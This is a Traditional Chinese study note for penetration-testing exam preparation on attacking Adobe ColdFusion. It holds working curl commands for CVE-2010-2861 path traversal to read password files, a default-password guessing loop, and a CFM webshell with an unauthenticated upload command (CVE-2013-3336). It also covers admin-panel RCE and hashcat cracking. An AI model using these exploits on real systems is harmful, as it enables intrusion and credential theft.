# 第 54B 章 - ColdFusion 發現與枚舉

## 標籤

- #cpts
- #chapter
- #services
- #coldfusion
- #java

## 學習目標

- 能快速辨識 ColdFusion 站點、版本與管理介面。
- 能枚舉 /CFIDE/administrator/ 並嘗試預設憑證。
- 理解 CVE-2010-2861 目錄遍歷與 CVE-2013-3336 檔案上傳的利用路徑。
- 能把 ColdFusion 發現轉成後續漏洞研究方向。

---

## 理論基礎

```text
Adobe ColdFusion：
  Port: 8500/tcp（預設 HTTP）、也可能在 80/443
  副檔名：.cfm（ColdFusion Markup Language）、.cfc（ColdFusion Component）
  管理面：/CFIDE/administrator/（Adobe CF）
           /cfdocs/（文件頁，常殘留）

高價值攻擊面：
  1. /CFIDE/administrator/ → 管理登入 → 若有效憑證可執行排程任務 → RCE
  2. CVE-2010-2861：目錄遍歷 → 讀取 password.properties（含 CF admin hash）
  3. CVE-2013-3336：未認證檔案上傳 → 上傳 CFM webshell → RCE（CF 8/9）
  4. 弱/預設憑證：admin:admin、空密碼等
  5. 版本資訊洩漏：/CFIDE/administrator/ 登入頁 / 錯誤頁含版本字串

常見版本：
  ColdFusion 8 / 9 → 多個嚴重 CVE
  ColdFusion 10 / 11 → CVE-2013-0625、CVE-2014-0546
  ColdFusion 2016+ → 相對較新，仍需確認版本
```

---

## 方法一：服務發現與辨識

```bash
# 掃描常見 ColdFusion 埠
nmap -sV -p 80,443,8500 TARGET_IP
# 8500/tcp → ColdFusion 預設 HTTP（若出現 ColdFusion-Server → 確認）

# 抓 Server header（快速辨識）
curl -s -I http://TARGET_IP:8500/
# Server: ColdFusion → 直接確認
# X-Powered-By: ColdFusion → 另一個線索

# 確認副檔名（找 .cfm 或 .cfc 頁面）
curl -s -I http://TARGET_IP/index.cfm
# 若回傳 200 或內容 → ColdFusion 確認

# 確認文件頁（常殘留）
curl -s http://TARGET_IP:8500/cfdocs/ | grep -i "ColdFusion"
# 若有 ColdFusion 版本字串 → 版本線索

# 確認管理介面（最重要）
curl -s -o /dev/null -w "%{http_code}" http://TARGET_IP:8500/CFIDE/administrator/
# 200 → 管理頁可存取 → 嘗試憑證
# 302 → 重定向到登入頁（追 Location）
# 403 → 存在但有 IP 限制
# 404 → 可能不在此路徑，試 Gobuster
```

---

## 方法二：版本辨識

```bash
# 方法一：從管理登入頁取得版本（最直接）
curl -s http://TARGET_IP:8500/CFIDE/administrator/ | grep -i "version\|coldfusion"
# 登入頁 HTML 常含版本資訊

# 方法二：從錯誤頁取得版本
curl -s http://TARGET_IP:8500/INVALID_PATH.cfm | grep -i "coldfusion\|adobe"
# 錯誤頁若未被自訂 → 洩漏版本與內部路徑

# 方法三：CVE-2010-2861 目錄遍歷讀取版本相關檔案
# ColdFusion 8/9/10 受影響
# 讀取 password.properties（含管理員密碼 hash）
curl -s "http://TARGET_IP:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../etc/passwd%00en"
# %00 → null byte（繞過副檔名限制）
# 若回傳 /etc/passwd 內容 → 目錄遍歷確認

# Windows 目標讀取 password.properties
curl -s "http://TARGET_IP:8500/CFIDE/administrator/enter.cfm?locale=../../../ColdFusion8/lib/password.properties%00en"
# 路徑依版本不同：
# CF8：ColdFusion8/lib/password.properties
# CF9：ColdFusion9/lib/password.properties
# CF10：ColdFusion10/cfusion/lib/password.properties

# 方法四：從 WDDX 封包取得版本
curl -s http://TARGET_IP:8500/CFIDE/componentutils/cfcexplorer.cfc?method=getcfcinhtml&component=
```

---

## 方法三：管理介面存取

```bash
# 枚舉高價值路徑
for PATH in /CFIDE/ /CFIDE/administrator/ /CFIDE/main.cfm \
  /cfdocs/ /CFIDE/debug/ /CFIDE/componentutils/; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" http://TARGET_IP:8500$PATH)
  echo "$PATH → $CODE"
done

# Gobuster（更完整）
gobuster dir -u http://TARGET_IP:8500 \
  -w /usr/share/seclists/Discovery/Web-Content/ColdFusion.txt \
  -t 30 -b 404
# 配合 ColdFusion 專用字典

# 嘗試預設/常見憑證（管理頁 POST）
curl -s -X POST http://TARGET_IP:8500/CFIDE/administrator/enter.cfm \
  -d "cfadminPassword=admin&requestedURL=%2FCFIDE%2Fadministrator%2Findex.cfm&salt=&submit=Login" \
  -c cf_cookies.txt -L -w "%{http_code}"
# -c → 儲存 cookie（登入成功後會有 session cookie）
# -L → 跟隨重定向
# 回傳 200 且有管理面內容 → 登入成功

# 試其他常見密碼
for PASS in admin password coldfusion Adobe1 blank; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
    http://TARGET_IP:8500/CFIDE/administrator/enter.cfm \
    -d "cfadminPassword=$PASS&requestedURL=%2FCFIDE%2Fadministrator%2Findex.cfm&salt=&submit=Login" -L)
  echo "Password: $PASS → HTTP $CODE"
done
```

---

## 方法四：CVE-2013-3336 未認證檔案上傳（CF 8/9）

```bash
# 前提：ColdFusion 8 或 9（未修補）
# 上傳點：/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm

# 建立惡意 CFM webshell
cat > /tmp/shell.cfm << 'EOF'
<cfexecute name="cmd.exe" arguments="/c #url.cmd#" variable="output" timeout="10">
<cfoutput>#output#</cfoutput>
EOF

# 上傳 webshell（無需認證）
curl -v -F "file=@/tmp/shell.cfm;filename=shell.cfm" \
  "http://TARGET_IP:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/"
# 若成功 → 回傳上傳路徑

# 觸發 webshell（Windows）
curl -s "http://TARGET_IP:8500/userfiles/file/shell.cfm?cmd=whoami"
# Linux（若 CF 在 Linux）
curl -s "http://TARGET_IP:8500/userfiles/file/shell.cfm?cmd=id"
```

---

## 方法五：管理面取得 RCE（有憑證）

```bash
# 若有管理員憑證，透過排程任務執行命令
# 1. 登入取得 session
curl -s -X POST http://TARGET_IP:8500/CFIDE/administrator/enter.cfm \
  -d "cfadminPassword=ADMIN_PASS&requestedURL=%2FCFIDE%2Fadministrator%2Findex.cfm&salt=&submit=Login" \
  -c cf_cookies.txt -L

# 2. 建立排程任務（執行命令）
# 進入 Debugging & Logging → Scheduled Tasks
# URL: http://TARGET_IP:8500/CFIDE/administrator/scheduler/scheduletasks.cfm
# 建立任務 → URL 填惡意 CFM 的路徑 → 設定立即執行

# 或使用 Metasploit
# use exploit/multi/http/coldfusion_scheduledtasks
# set RHOSTS TARGET_IP
# set RPORT 8500
# set USERNAME admin
# set PASSWORD ADMIN_PASS
# run
```

---

## 決策流程

```
nmap 確認 8500 或找 .cfm 頁面
    ↓
辨識版本（/CFIDE/administrator/ 登入頁 / 錯誤頁）
    ↓
版本 8/9？
  → CVE-2010-2861：讀取 password.properties → 取得 hash → hashcat 破解
  → CVE-2013-3336：未認證上傳 CFM webshell → RCE
    ↓
/CFIDE/administrator/ 存在？
  → 嘗試預設憑證（admin:空/admin）
  → 若成功：排程任務 → RCE（Metasploit）
    ↓
有 hash（CVE-2010-2861）？
  → SHA1 hash → hashcat -m 100 hash.txt rockyou.txt
  → 破解後登入管理面 → RCE
```

---

## 速查表

```bash
# 版本辨識
curl -s http://TARGET_IP:8500/CFIDE/administrator/ | grep -i version
curl -s http://TARGET_IP:8500/INVALID.cfm | grep -i coldfusion

# CVE-2010-2861 目錄遍歷（讀 password.properties）
curl -s "http://TARGET_IP:8500/CFIDE/administrator/enter.cfm?locale=../../../ColdFusion8/lib/password.properties%00en"

# 高價值路徑枚舉
for P in /CFIDE/ /CFIDE/administrator/ /cfdocs/; do
  echo "$P: $(curl -s -o /dev/null -w '%{http_code}' http://TARGET_IP:8500$P)"
done

# CVE-2013-3336 檔案上傳
curl -F "file=@shell.cfm;filename=shell.cfm" \
  "http://TARGET_IP:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/"

# 破解 CF admin hash（SHA1）
hashcat -m 100 cf_hash.txt /usr/share/wordlists/rockyou.txt
```

---

## 常見錯誤與排查

- 只在 80/443 找，忘記 8500 是 CF 預設埠。
- 看到 /CFIDE/ 403 就放棄 — 403 代表存在！試不同子路徑。
- 忘記嘗試 CVE-2010-2861 讀取 hash — 這是 CF 8/9 最直接的路徑。
- 上傳 CFM 後忘記找上傳路徑觸發 — 看 upload 回應中的路徑。

---

## 關聯筆記

- [[54-其他企業服務|第 54 章 - 其他企業服務]]
- [[54A-Tomcat-探索與枚舉|第 54A 章 - Tomcat 探索與枚舉]]
- [[../04-Web/35A-應用程式探索與CMS列舉|第 35A 章 - 應用程式探索與 CMS 列舉]]
